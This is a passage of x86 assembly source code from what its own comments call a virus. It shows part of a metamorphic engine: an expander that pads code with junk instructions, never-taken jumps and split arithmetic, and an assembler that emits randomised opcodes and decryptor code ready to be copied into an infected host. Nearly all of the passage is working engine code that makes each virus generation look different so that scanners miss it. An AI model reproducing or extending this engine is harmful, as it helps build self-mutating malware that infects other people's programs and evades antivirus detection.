                jnz     Xp_DecreaseRecurseLevel
                call    Random         ; Make a quantity of bytes from 1 to 8
                and     eax, 7
                add     eax, 1
                mov     ecx, eax
      @@LoopInsert:
                call    Random        ; Get a random byte
                mov     al, 0FDh      ; Set FD pseudoopcode (it means "insert
                mov     [edi], eax    ; this byte directly into the code").
                add     edi, 10h
                sub     ecx, 1
                or      ecx, ecx      ; Repeat it the random number that we
                jnz   @@LoopInsert    ; got before
                jmp     Xp_DecreaseRecurseLevel

;; Let's insert an instruction that acts as a stop mark for the code branch.
;; This is necessary because if we code a jump as a CMP Reg,Reg / JZ @xxx,
;; the disassembler will continue tracing the code after the JZ (it's just
;; a conditional jump, not an unconditional one). So, we must set a "release"
;; mark that makes the disassembler to stop processing this line of code: RET,
;; JMP Reg or JMP Mem.
@@InsertStopMark:
                call    Random
                and     eax, 3
                or      eax, eax       ; 0?
                jz    @@InsertStopMark ; Then select another number
                cmp     eax, 1
                jz    @@GenerateRET    ; Make RET
                cmp     eax, 2
                jz    @@GenerateJMPMem ; Make JMP Mem
        ; Make a JMP Reg. We don't care where it goes, since it's never
        ; going to be executed.
   @@GenerateJMPReg:
                call    Xp_SaveOperation
                call    Random           ; Get a random register
                and     eax, 7           ; Set it
                mov     [ebp+Xp_Register], eax
                xor     eax, eax         ; Mark 32 bits size
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenJMPReg     ; Generate a JMP Reg
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
        ; Make a JMP [Mem]
   @@GenerateJMPMem:
                call    Xp_SaveOperation ; Allocate a temporary variable
                call    Xp_GetTempVar
             ;   mov     eax, [ebp+Xp_Immediate] ; Something that I did and
             ;   and     eax, 0FFFF00FFh         ; I don't remember why... :?
             ;   mov     [ebp+Xp_Immediate], eax
                call    Xp_GenJMPMem           ; Generate a JMP Mem
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@GenerateRET:
                call    Xp_GenRET              ; Generate a RET
                jmp     Xp_DecreaseRecurseLevel
Xp_GenJMP       endp

;; This function generates a conditional jump directly or composed. Here we
;; use all the variants the shrinker is capable to shrink (obviously, because
;; if not this jumps would never be compressed).
Xp_GenJcc       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 2   ; Code the composed jumps only on the first
                jae   @@Single   ; levels of recursivity
                call    Random
                and     eax, 3   ; Make it directly with a prob. of 75%
                or      eax, eax
                jnz   @@Single
   @@Double:    call    Random
                and     eax, 0Fh
                or      eax, eax      ; Get a chance of 1/16
                jnz   @@Double2       ; If the odds selected the other 15/16,
                                      ; make a normal double
                mov     eax, 1        ; Mark the conditional jump as being
                mov     [edi+7], eax   ; coded as NEG_Jcc + JMP. For example:
                call  @@InternalSingle2 ; JZ @x  -->  JNZ @y/JMP @x/ @y:
                jmp     Xp_DecreaseRecurseLevel

   @@Double2:   mov     eax, [ebp+Xp_Operation]
                cmp     eax, 73h     ; JAE?
                jz    @@Double_JAE
                cmp     eax, 75h     ; JNZ?
                jz    @@Double_JNZ
                cmp     eax, 76h     ; JBE?
                jnz   @@Single
   @@Double_JBE:
                mov     ebx, 72h   ; If JBE, we can select any pair from
                mov     ecx, 74h   ; the set JB,JZ,JBE and we'll making a JBE
                mov     edx, 76h
                jmp   @@Double_GarbleAndSelect
   @@Double_JNZ:
                mov     ebx, 72h   ; If JNZ, we can select a pair from the
                mov     ecx, 75h   ; set JB,JNZ,JA
                mov     edx, 77h
                jmp   @@Double_GarbleAndSelect
   @@Double_JAE:
                mov     ebx, 73h   ; If JAE, the set to select is JAE,JZ,JA
                mov     ecx, 74h
                mov     edx, 77h
   @@Double_GarbleAndSelect:
                call    Xp_GarbleRegisters ; Get ramdomly two from that set.
                call    Xp_SaveOperation
                push    ecx
                mov     [ebp+Xp_Operation], edx  ; Generate the first Jcc
                call  @@InternalSingle
                pop     ecx
                mov     [ebp+Xp_Operation], ecx  ; Generate the second Jcc
                call  @@InternalSingle
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    call  @@InternalSingle           ; Make it single
                jmp     Xp_DecreaseRecurseLevel

Xp_GenJcc_SingleJcc:
   @@InternalSingle:
                xor     eax, eax        ; For singles, we mark the Jcc as
                mov     [edi+7], eax    ; not being NEG_Jcc/JMP
   @@InternalSingle2:
                mov     eax, [ebp+Xp_Operation]  ; Code the instruction
                mov     [edi], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+1], eax
                add     edi, 10h
                ret
Xp_GenJcc       endp

;; This function is to generate a MOVZX. We have three variants: the MOVZX
;; itself, MOV Reg,[Mem]/AND Reg,0FF or MOV Reg,0/MOV Reg8,[Mem]
Xp_GenMOVZX     proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    RandomBoolean   ; Single?
                or      eax, eax
                jz    @@Single          ; Then, jump
                call    RandomBoolean
                or      eax, eax
                jz    @@Double_1        ; Pair 1 or pair 2?
       @@Double_2:
                xor     eax, eax        ; First construct the MOV Reg,[Mem]
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegMem  ; Generate the operation
                xor     eax, eax        ; And now make AND Reg,0FFh
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 20h
                mov     [ebp+Xp_Operation], eax
                mov     eax, 0FFh
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenOPRegImm  ; Generate the operation
                jmp     Xp_DecreaseRecurseLevel
       @@Double_1:
                mov     eax, [ebp+Register8Bits]
                call    Xpand_TranslateRegister
                mov     ebx, [ebp+Xp_Register]
                cmp     eax, ebx
                jnz   @@Double_2
                mov     eax, 40h         ; Make first a MOV Reg,0
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_Immediate], eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegImm
                mov     eax, 80h         ; And now make a MOV Reg8,[Mem]
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem
                jmp     Xp_DecreaseRecurseLevel
       @@Single:
                mov     eax, 0F8h        ; Code directly the instruction.
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenMOVZX     endp

;; Function to make the SET_WEIGHT code mark.
Xp_MakeSET_WEIGHT proc
                call    Xp_SaveOperation
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPUSHReg
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                call    Xp_RestoreOperation
                mov     eax, [ebp+Xp_Immediate]
                or      eax, eax
                jz    @@ReadWeightIdent0
                cmp     eax, 1
                jz    @@ReadWeightIdent1
                cmp     eax, 2
                jz    @@ReadWeightIdent2
                cmp     eax, 3
                jz    @@ReadWeightIdent3
                cmp     eax, 4
                jz    @@ReadWeightIdent4
       @@ReadWeightIdent5:
                mov     eax, [ebp+Weight_X020_23]
                jmp   @@SetWeight
       @@ReadWeightIdent0:
                mov     eax, [ebp+Weight_X000_3]
                jmp   @@SetWeight
       @@ReadWeightIdent1:
                mov     eax, [ebp+Weight_X004_7]
                jmp   @@SetWeight
       @@ReadWeightIdent2:
                mov     eax, [ebp+Weight_X008_11]
                jmp   @@SetWeight
       @@ReadWeightIdent3:
                mov     eax, [ebp+Weight_X012_15]
                jmp   @@SetWeight
       @@ReadWeightIdent4:
                mov     eax, [ebp+Weight_X016_19]
       @@SetWeight:
                mov     [ebp+Xp_Immediate], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm

                call    Xp_GenOPMemReg

                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPOPReg
                ret
Xp_MakeSET_WEIGHT endp


;;; ------------------------------------------------
;;;

;; Now these are helper functions. They are used from other parts of the
;; engine, not only by the expander.
;; This function is an optimization of how we cam make in little code a
;; permutation of three registers in a way that every possible combination
;; is present, and moreover all them have the same probability of appear.
;; The theory is that there are 6 possible permutations for a set of three
;; values (in this case EBX, ECX and EDX). Then, following the code, you'll
;; see that the permutation is made by:
;;
;; 1) Randomly decide if goto 3)
;; 2) Exchange 1st and 2nd OR Exchange 1st and 3rd (always)
;; 3) Decide if we exchange 2nd and 3rd. Do it or not.
Xp_GarbleRegisters proc
                call    Random
                and     eax, 3
                or      eax, eax
                jz      Xp_GarbleRegisters
                cmp     eax, 1
                jz    @@Permutation0
                cmp     eax, 2
                jz    @@Permutation1
    @@Permutation2:
                mov     eax, ebx
                mov     ebx, edx
                mov     edx, eax   ; XCHG EBX,EDX
                jmp   @@Permutation0
    @@Permutation1:
                mov     eax, ebx
                mov     ebx, ecx
                mov     ecx, eax   ; XCHG EBX,ECX
    @@Permutation0:
                call    RandomBoolean
                or      eax, eax
                jz    @@Return
    @@Permutation0_0:
                mov     eax, edx
                mov     edx, ecx
                mov     ecx, eax   ; XCHG ECX,EDX
    @@Return:   ret
Xp_GarbleRegisters endp

;; Get an special conditional jump. The jump obtained here is specially
;; selected to be used for CMP Reg,Reg/Jcc @x pairs. The direct result from
;; this instruction will make that the conditional jump never occurs, while
;; if we inverse the bit 0 of the Jcc returned we'll make that the Jcc
;; always jump.
;; The algorithm here is a hard optimization to select one of that types of
;; jumps. The jumps that act like a NOP are JO/JB/JNZ/JA/JS/JNP/JL/JG, while
;; the ones that always jump are JNO/JAE/JZ/JBE/JNS/JP/JGE/JLE. We are going
;; to use only the NOP ones. The opcodes in number are:
;;
;; 70,72,75,77,78,7B,7C,7F
;;
;; So these are the only values we can return. We pass them to binary (only
;; the low nibble):
;;
;; 0000,0010,0101,0111,1000,1011,1100,1111
;;
;; And we see that the values are repeated in a certain way. Let's join them
;; in groups:
;; 0000   1000         0 00 0     1 00 0
;; 0010   1011         0 01 0     1 01 1
;; 0101   1100   -->   0 10 1     1 10 0
;; 0111   1111         0 11 1     1 11 1
;;
;; The numbers are the same, excepting by the high bit and the low one.
;; Now, just notice that when the high bit is clear the lowest bit is the
;; same than the bit 2, and when the high bit is set the lowest bit is equal
;; to the bit 1. Then, what we do is to copy the bit 2 or 1 to the bit 0
;; depending if bit 3 is 0 or 1. Just what we do below.
Xp_GetSpecialJcc proc
                push    ebx
                call    Random
                mov     ebx, eax  ; Copy the random in EBX
                and     eax, 0Eh  ; Get a random number from 00 to 0E (even)
                cmp     eax, 8    ; High bit active?
                jae   @@Next      ; Then only shift EBX once
                shr     ebx, 1
      @@Next:   shr     ebx, 1
                and     ebx, 1    ; Get the resulting last bit
                add     eax, ebx  ; Add it to the random from 00 to 0E
                add     eax, 70h  ; Convert it to Jcc
                pop     ebx
                ret
Xp_GetSpecialJcc endp

;; This function will take the operation to perform (in an OP Reg/Mem,Imm
;; operation) and will calculate a pair of operation that do the same with
;; a new Imm value for each one. The MOV has the most variated results, and
;; there are others that can't be decomposed, such SUB.
;; The decomposition is done in the following way for every case. I had to
;; deduce each formula (concretely for OR and AND) from scratch, so maybe
;; there are others better, but I didn't find them. Maybe the formulas
;; below aren't correct: that's because I coded it, optimize it, and I didn't
;; remember to write down the process, so I have to re-deduce them :).
;;
;; Taking Rnd1, Rnd2 as random numbers, and Imm as the destiny value:
;; MOV:
;;      MOV Rnd1, ADD Imm-Rnd1
;;      MOV Rnd1&Imm, OR ((Rnd2 & Imm)^(Rnd1 & Imm))|(Rnd2 & Imm)
;;      MOV (Rnd2 & NOT(Rnd1))|Imm, AND (Rnd1 | Imm)  (1)
;;      MOV NOT(Rnd1)|Imm, AND Rnd1|Imm               (2)
;;      MOV Rnd1, XOR Rnd1^Imm
;;
;; ADD:
;;      ADD Rnd1, ADD Imm-Rnd1
;; OR:
;;      OR Rnd1&Imm, OR ((Rnd1&Imm)^Imm)|(Imm&Rnd2)
;; AND:
;;      AND Imm|Rnd1, AND Imm|NOT(Rnd1)
;; XOR:
;;      XOR Rnd1, XOR Imm^Rnd1
;;
Xp_MakeComposedOPImm proc
                call    Xp_SaveOperation
                call    Random
                mov     ebx, eax                 ; Get a random number in EBX
                mov     edx, [ebp+Xp_Immediate]  ; Get the Imm in EDX
                mov     eax, [ebp+Xp_Operation]  ; Get the operation
                or      eax, eax
                jz    @@Double_OP_ADD       ; ADD?
                cmp     eax, 8
                jz    @@Double_OP_OR        ; OR?
                cmp     eax, 20h
                jz    @@Double_OP_AND       ; AND?
                cmp     eax, 30h
                jz    @@Double_OP_XOR       ; XOR?
                cmp     eax, 40h
                jnz   @@Return_Error
   @@Double_OP_MOV:                         ; MOV?
                call    Random
                and     eax, 7
                or      eax, eax
                jz    @@Double_OP_MOV_ADD   ; MOV + ADD
                cmp     eax, 1
                jz    @@Double_OP_MOV_OR    ; MOV + OR
                cmp     eax, 2
                jz    @@Double_OP_MOV_AND   ; MOV + AND
                cmp     eax, 3
                jz    @@Double_OP_MOV_XOR   ; MOV + XOR
                cmp     eax, 4
                jnz   @@Double_OP_MOV       ; MOV only
   @@Double_OP_MOV_MOV:
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_MOV_MOV_MakeReg
                call    Xp_GenOPMemImm
                jmp   @@Return_NoError
   @@Double_OP_MOV_MOV_MakeReg:
                call    Xp_GenOPRegImm
                jmp   @@Return_NoError

   @@Double_OP_MOV_ADD:                     ; Calculate the two Imms for
                sub     edx, ebx            ; MOV + ADD
                xor     ecx, ecx
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_OR:
                and     ebx, edx            ; Calculate the two Imms for
                call    Random              ; MOV + OR
                and     eax, edx
                xor     edx, ebx
                or      edx, eax
                mov     ecx, 8
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_AND:
                call    RandomBoolean         ; Calculate the two Imms for
                or      eax, eax              ; MOV + AND (two different
                jz    @@Double_OP_MOV_AND_2   ; methods)
                call    Random
                not     ebx
                and     eax, ebx
                not     ebx
                mov     ecx, eax
                or      ecx, edx
                or      edx, ebx
                mov     ebx, ecx
                mov     ecx, 20h
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_AND_2:
                mov     ecx, ebx
                not     ecx
                or      ecx, edx
                or      edx, ebx
                mov     ebx, ecx
                mov     ecx, 20h
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_XOR:                     ; Calculate the two Imms for XOR
                xor     edx, ebx
                mov     ecx, 30h
   @@Double_OP_MOV_OP:                      ; Make the two instructions:
                push    ecx
                push    edx
                mov     eax, 40h            ; Generate a MOV Reg/Mem,Imm1
                mov     [ebp+Xp_Operation], eax
                mov     [ebp+Xp_Immediate], ebx
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_MOV_OP_MakeReg
                call    Xp_GenOPMemImm
                pop     edx
                pop     ecx                 ; Generate an OP Mem,Imm2
                mov     [ebp+Xp_Operation], ecx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPMemImm
                jmp   @@Return_NoError
   @@Double_OP_MOV_OP_MakeReg:
                call    Xp_GenOPRegImm
                pop     edx                 ; Generate an OP Reg,Imm2
                pop     ecx
                mov     [ebp+Xp_Operation], ecx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPRegImm
                jmp   @@Return_NoError

   @@Double_OP_ADD:
                sub     edx, ebx       ; Calculate the 2nd Imm for ADD
                jmp   @@Double_OP_OP
   @@Double_OP_OR:
                and     ebx, edx       ; Calculate the two Imms for OR+OR
                mov     ecx, edx
                xor     edx, ebx
                call    Random
                and     ecx, eax
                or      edx, ecx
                jmp   @@Double_OP_OP
   @@Double_OP_AND:
                mov     ecx, ebx       ; Calculate the two Imms for AND+AND
                or      ebx, edx
                not     ecx
                or      edx, ecx
                jmp   @@Double_OP_OP
   @@Double_OP_XOR:
                xor     edx, ebx       ; Calculate the two Imms for XOR+XOR
   @@Double_OP_OP:
                push    edx          ; Make OP Mem/Reg,Imm1 + OP Mem/Reg,Imm2
                mov     [ebp+Xp_Immediate], ebx
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_OP_MakeReg
                call    Xp_GenOPMemImm    ; Make OP Mem,Imm1
                pop     edx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPMemImm    ; Make OP Mem,Imm2
                jmp   @@Return_NoError
   @@Double_OP_OP_MakeReg:
                call    Xp_GenOPRegImm    ; Make OP Reg,Imm1
                pop     edx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPRegImm    ; Make OP Reg,Imm2
   @@Return_NoError:
                call    Xp_RestoreOperation
                xor     eax, eax
                ret
   @@Return_Error:
                call    Xp_RestoreOperation
                mov     eax, 1
                ret
Xp_MakeComposedOPImm endp

;; This function increases the recursivity level and returns the result in
;; EAX (as a side level :).
Xp_IncreaseRecurseLevel proc
                mov     eax, [ebp+Xp_RecurseLevel]
                add     eax, 1
                mov     [ebp+Xp_RecurseLevel], eax
                ret
Xp_IncreaseRecurseLevel endp

;; This function restores the previous saved operation and decreases the
;; recursivity level previously increased.
Xp_RestoreOpAndDecreaseRecurseLevel proc
                call    Xp_RestoreOperation
Xp_RestoreOpAndDecreaseRecurseLevel endp    ; No return! Continue directly
                                            ; to the next function

;; This is an entrypoint for decreasing only the recursivity level (with no
;; function restoration).
Xp_DecreaseRecurseLevel proc
                mov     eax, [ebp+Xp_RecurseLevel]
                sub     eax, 1
                mov     [ebp+Xp_RecurseLevel], eax
                ret
Xp_DecreaseRecurseLevel endp

;; This code copies the indexes and the addition of the current used memory
;; address to the appropiated fields of the current instruction at <EDI>.
Xp_CopyMemoryReference proc
                mov     eax, [ebp+Xp_Mem_Index1]
                mov     [edi+1], eax
                mov     eax, [ebp+Xp_Mem_Index2]
                mov     [edi+2], eax
                mov     eax, [ebp+Xp_Mem_Addition]
                mov     [edi+3], eax
                ret
Xp_CopyMemoryReference endp

;; Function to save the current operation into the stack
Xp_SaveOperation proc
                pop     ebx           ; Return address
                mov     eax, [ebp+Xp_Operation]
                push    eax                       ; Save all the values of
                mov     eax, [ebp+Xp_Mem_Index1]  ; the current operation
                push    eax
                mov     eax, [ebp+Xp_Mem_Index2]
                push    eax
                mov     eax, [ebp+Xp_Mem_Addition]
                push    eax
                mov     eax, [ebp+Xp_Register]
                push    eax
                mov     eax, [ebp+Xp_SrcRegister]
                push    eax
                mov     eax, [ebp+Xp_Immediate]
                push    eax
                mov     eax, [ebp+Xp_8Bits]
                push    eax
                push    ebx                 ; Push again the return address
                ret
Xp_SaveOperation endp

;; Function to restore the current operation from the stack
Xp_RestoreOperation proc
                pop     ebx           ; Return address
                pop     eax
                mov     [ebp+Xp_8Bits], eax
                pop     eax                        ; Restore all the values
                mov     [ebp+Xp_Immediate], eax    ; previously stored in the
                pop     eax                        ; stack
                mov     [ebp+Xp_SrcRegister], eax
                pop     eax
                mov     [ebp+Xp_Register], eax
                pop     eax
                mov     [ebp+Xp_Mem_Addition], eax
                pop     eax
                mov     [ebp+Xp_Mem_Index2], eax
                pop     eax
                mov     [ebp+Xp_Mem_Index1], eax
                pop     eax
                mov     [ebp+Xp_Operation], eax
                push    ebx
                ret
Xp_RestoreOperation endp

;; Allocate a temporary variable. The variable is marked in the memory section
;; dedicated to that marks, to avoid its reusing. Since we have a data section
;; of 128 Kb, we have 16384 temporary variables to use (more than sufficient
;; for this virus). If what we are doing is expanding a decryptor code, then
;; we only use the first 4 Kb of the memory frame (the memory that we'll have
;; available in the host).
Xp_GetTempVar   proc
                push    edx
                call    Random
                mov     edx, eax          ; Get a random number
    @@VariableCheck:
                and     edx, 1FFF8h       ; Mask the value
                mov     eax, [ebp+CreatingADecryptor]
                or      eax, eax          ; If we are making a decryptor, then
                jz    @@Normal1           ; we only get variables from the
                and     edx, 00FF8h       ; first 4 Kb and avoiding the first
                cmp     edx, 20h          ; 32 bytes (used by the decryptor
                jb    @@Add20             ; for making its operations) and the
                cmp     edx, 0F00h        ; last 100h bytes (a random offset
                jb    @@Normal1           ; that we set at decryptor creation)
                xor     edx, edx
    @@Add20:    add     edx, 20h
    @@Normal1:  add     edx, [ebp+VarMarksTable]
                mov     eax, [edx]        ; Look if it's already marked.
                or      eax, eax          ; If it is, Get the next one and
                jz    @@VariableFound     ; look again.
                sub     edx, [ebp+VarMarksTable]
                add     edx, 8
                jmp   @@VariableCheck
    @@VariableFound:                      ; When we find an unallocated one,
                mov     eax, 1            ; we mark it.
                mov     [edx], eax
                sub     edx, [ebp+VarMarksTable]
                call    Random            ; Now we get an internal random
                and     eax, 3            ; offset from 0 to 3 and we add it
                add     edx, eax          ; to the address.
                mov     eax, [ebp+CreatingADecryptor]
                or      eax, eax
                jz    @@Normal2           ; If we are making a decryptor, we
                add     edx, [ebp+Decryptor_DATA_SECTION] ; set no_reg as
                mov     [ebp+Xp_Mem_Addition], edx        ; index register.
                mov     eax, 8                       ; If not, we translate
                jmp   @@Continue                     ; the delta register and
    @@Normal2:  add     edx, [ebp+New_DATA_SECTION]  ; we set it, so the var
                mov     [ebp+Xp_Mem_Addition], edx   ; is [DLT_REG+xxx]
                mov     eax, [ebp+DeltaRegister]
                call    Xpand_TranslateRegister
    @@Continue: mov     [ebp+Xp_Mem_Index1], eax  ; Set the index1 register
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax  ; Set the index2 as <no_reg>
                pop     edx
                ret
Xp_GetTempVar   endp

;; This function generates garbage instructions that will be eliminated by the
;; shrinker. They are compressed to NOPs.
Xp_InsertGarbage proc
                call    Random
                and     eax, 7             ; Get a random method
                or      eax, eax
                jz    @@MakeOneByter       ; Make a one byte instruction
                cmp     eax, 1
                jz    @@MakeMOVRegReg      ; Make MOV Reg,Reg (the same reg)
                cmp     eax, 2
                jz    @@MakeANDs1          ; Make AND Reg,-1
                cmp     eax, 3
                jz    @@MakeOR0            ; Make OR Reg,0
                cmp     eax, 4
                jz    @@MakeXOR0           ; Make XOR Reg,0
                cmp     eax, 5
                jz    @@MakeADD0           ; Make ADD Reg,0
                cmp     eax, 6
                jz    @@MakeCMPJcc         ; Make CMP Reg,Reg/Jcc (Jcc never
                                           ; jumps)
                jmp     Xp_InsertGarbage   ; Select another if 7

        @@MakeADD0:
                xor     eax, eax           ; Set the operation ADD
                mov     [ebp+Xp_Operation], eax
        @@MakeOP0:
                xor     eax, eax           ; Imm = 0
                mov     [ebp+Xp_Immediate], eax
        @@MakeOPx:
                xor     eax, eax           ; Set 0 at the field of labels
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi     ; Set the instruction pointer
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax  ; Set "32 bits"
        @@MakeOPReg0:
                call    Random          ; Get a random register. It must not
                and     eax, 7          ; be ESP nor the delta register
                cmp     eax, 4
                jz    @@MakeOPReg0
                cmp     eax, [ebp+TranslatedDeltaRegister]
                jz    @@MakeOPReg0
                mov     [ebp+Xp_Register], eax ; Set the register and make
                call    Xp_GenOPRegImm         ; the operation
                ret

        @@MakeOR0:
                mov     eax, 8            ; Set operation OR
                mov     [ebp+Xp_Operation], eax
                jmp   @@MakeOP0

        @@MakeXOR0:
                mov     eax, 30h          ; Set operation XOR
                mov     [ebp+Xp_Operation], eax
                jmp   @@MakeOP0

        @@MakeANDs1:
                mov     eax, 20h          ; Set operation AND
                mov     [ebp+Xp_Operation], eax
                mov     eax, -1           ; Set -1 as Immediate
                mov     [ebp+Xp_Immediate], eax
                jmp   @@MakeOPx


        @@MakeCMPJcc:
                call    Random         ; Get a register to compare
                and     eax, 7         ; If ESP or delta, we jump to make
                cmp     eax, 4         ; other type of garbage. It's better
                jz    @@MakeADD0       ; to not use this much, because then
                cmp     eax, [ebp+TranslatedDeltaRegister] ; the code uses too
                jz    @@MakeADD0       ; many jumps in future generations (in
                                       ; the third dimension :).
                mov     [ebp+Xp_Register], eax    ; Set the same register as
                mov     [ebp+Xp_SrcRegister], eax ; source and destiny
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax   ; Set 32 bits size
                mov     [edi+0Bh], eax        ; Clear the label flag and set
                mov     [edi+0Ch], esi        ; the pointer
                mov     eax, 38h              ; CMP Reg,Reg
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegReg        ; Generate the operation
                call    Xp_GetSpecialJcc      ; Get a special Jcc that never
                mov     [ebp+Xp_Operation], eax ; jumps
        @@OtherLabel:
                call    Random                ; Get a random label from the
                and     eax, 01F8h            ; list of labels
                cmp     eax, [ebp+NumberOfLabels]
                jae   @@OtherLabel
                add     eax, [ebp+LabelTable] ; Make it jump there (in theory)
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenJcc_SingleJcc   ; Generate a single Jcc
                ret

        @@MakeMOVRegReg:
                call    Random          ; Get a random register
                and     eax, 7
                cmp     eax, 4
                jz    @@MakeMOVRegReg
                cmp     eax, [ebp+TranslatedDeltaRegister]
                jz    @@MakeMOVRegReg
                mov     [ebp+Xp_Register], eax   ; Set it as source & dest.
                mov     [ebp+Xp_SrcRegister], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax      ; Set 32 bits size
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi    ; Clear label and set pointer
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax ; Make MOV Reg,Reg
                call    Xp_GenOPRegReg
                ret

        @@MakeOneByter:
                call    RandomBoolean    ; Get random TRUE or FALSE
                or      eax, eax
                jz    @@OnlyNOP          ; If FALSE, make a NOP
                call    Random
                and     eax, 0100h       ; Get CLC or STC
                add     eax, 0F8FDh      ; Set the instruction as a direct
                jmp   @@OtherOneByter    ; byte
   @@OnlyNOP:   mov     eax, 90FDh       ; Set NOP
   @@OtherOneByter:
                mov     [edi], eax       ; Set the instruction
                xor     eax, eax
                mov     [edi+0Bh], eax   ; Clear the "label-on" flag
                mov     [edi+0Ch], esi   ; Set the pointer
                add     edi, 10h
                call    Random           ; Select if we make again other
                and     eax, 0Fh         ; random byte (a prob. of 1/16)
                or      eax, eax
                jz    @@MakeOneByter
                ret
Xp_InsertGarbage endp
;;
;;
;; End of the expander
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;KEYWORD: Key_!Assembler
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The assembler
;; -------------
;;
;; This code will convert from our reassembler directly into 80x86 opcodes.
;;
;; The assembly is done directly, I mean, this function doesn't add more
;; instructions randomly, since that work must be done by the expander. The
;; only random operations this code does is at opcode level.
;;
;; The generated code is completely prepared to be copied directly to the
;; host. All the instructions using relative displacements are fixed and
;; assembled to randomly their short or long form (when it's possible to use
;; a short jump). The reassembly also supports foward references.
;; 
AssembleCode    proc
                xor     eax, eax
                mov     [ebp+NumberOfJumpRelocations], eax ; Initialize the
                                            ; after-assembly jump relocations
                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+NewAssembledCode]
      ;; Mark all labels in instructions
                mov     ecx, [ebp+NumberOfLabels]   ; Let's mark all the
                mov     edx, [ebp+LabelTable]       ; instructions that has
     @@LoopSetLabel:                                ; a label, just in case
                mov     ebx, [edx+4]                ; someone hasn't been
                mov     eax, [ebx+0Bh]              ; marked before.
                or      eax, 01h
                mov     [ebx+0Bh], eax
                add     edx, 8
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopSetLabel

   @@LoopAssemble_01:
                mov     eax, [esi+0Bh]      ; Get the label mark
                and     eax, 0FFh           ; If it has a label, let's set it
                cmp     eax, 1
                jnz   @@Assemble_Instruction
                mov     eax, [ebp+NumberOfLabels] ; Get the label table
                mov     edx, [ebp+LabelTable]
   @@LoopCheckLabel:
                cmp     [edx+4], esi        ; Search the label. When we find
                jnz   @@CheckNextLabel      ; it, we set the current assembly
                mov     [edx], edi          ; EIP.
   @@CheckNextLabel:
                add     edx, 8              ; Next
                dec     eax
                or      eax, eax
                jnz   @@LoopCheckLabel
   @@Assemble_Instruction:
                call    AssembleInstruction ; Assemble the instruction
                add     esi, 10h            ; Increase pseudoassembler pointer
                mov     eax, [ebp+AddressOfLastInstruction]
                cmp     esi, eax            ; Is it the last instruction?
                jb    @@LoopAssemble_01     ; If not, loop again
                mov     [ebp+AddressOfLastInstruction], edi ; Set the last
                                                            ; instruction
                mov     eax, edi
                sub     eax, [ebp+NewAssembledCode] ; Get the size of the code
                mov     [ebp+SizeOfNewCode], eax
                add     eax, 20h            ; Set a mini data frame for some
                                            ; possibilities of the decryptor
                mov     ebx, 0F000h     ; Let's get the rounded size of the
   @@LoopGetRoundedSize:                ; code (rounded up to 4 Kb), with a
                add     ebx, 1000h      ; minimum value of F000
                cmp     ebx, eax
                jb    @@LoopGetRoundedSize
                mov     [ebp+RoundedSizeOfNewCode], ebx

                mov     eax, 4000h      ; Get the size of the code rounded up
   @@LoopGetSizeP2:                     ; to the next power of 2 (for the
                shl     eax, 1          ; Pseudo-Random Index DEcryption)
                cmp     eax, [ebp+SizeOfNewCode]
                jb    @@LoopGetSizeP2
                mov     [ebp+SizeOfNewCodeP2], eax

  ;; Now we are going to complete the jumps that we left until the whole
  ;; code is assembled.
                mov     esi, [ebp+JumpRelocationTable]
                mov     ecx, [ebp+NumberOfJumpRelocations]

    @@LoopReloc01:
                mov     edi, [esi]    ; Get the jump and the address
